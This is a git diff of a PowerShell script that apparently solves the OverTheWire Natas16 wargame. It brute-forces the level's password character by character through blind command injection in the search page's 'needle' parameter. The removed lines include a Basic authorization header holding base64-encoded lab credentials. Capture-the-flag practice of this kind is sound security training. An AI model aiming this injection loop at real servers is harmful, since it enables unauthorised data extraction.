@@ -1,8 +1,22 @@
-$authorization = "Basic bmF0YXMxNjpoUGtqS1l2aUxRY3RFVzMzUW11WEw2ZURWZk1XNHNHbw=="
+param (
+    [Parameter(Mandatory = $true)]
+    [string]$server,
+    [Parameter(Mandatory = $true)]
+    [string]$username,
+    [Parameter(Mandatory = $true)]
+    [string]$password
+)
+$url = $server
+
+$pair = "${username}:${password}"
+$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
+$base64 = [System.Convert]::ToBase64String($bytes)
+$authorization = "Basic $base64"
+
 $headers = @{
     "Authorization" = $authorization
     "Content-Type"  = "application/x-www-form-urlencoded"
-}
+} 
 
 $correctStr = "British"
 $wrongStr = "Africa"
@@ -18,18 +32,14 @@ function Send_Command {
         [string]$command
     )
     if ($command) {
-        $url = "http://natas16.natas.labs.overthewire.org/?needle=$command&submit=Search"    
-        #$url = [URI]::EscapeUriString($url)	 
-        #write-host "`n$url"
+        $curl = $server + "/?needle=$command&submit=Search"     
+        $curl = [URI]::EscapeUriString($curl)
 
-     
-            $url = [URI]::EscapeUriString($url)
-
-            $response = Invoke-WebRequest -URI $url -Headers $headers -Method 'GET' -UseBasicParsing
-            if (!$response) {
-                Write-Host "Error!"
-                exit
-            }
+        $response = Invoke-WebRequest -URI $curl -Headers $headers -Method 'GET' -UseBasicParsing
+        if (!$response) {
+            Write-Host "Error!"
+            exit
+        }
         return $response
     }
 }
@@ -59,7 +69,6 @@ for ($position = 1; $position -le 32; $position ++) {
         if ($response) {
             if ($response.Content -like "*$correctStr*") {
                 if ($response.Content -notlike "*$wrongStr*") {
-                    #listen bro idk im tired ok leave me alone
                     $result += $char
                     Write-Host "Char $position" + ": $char"
                     break
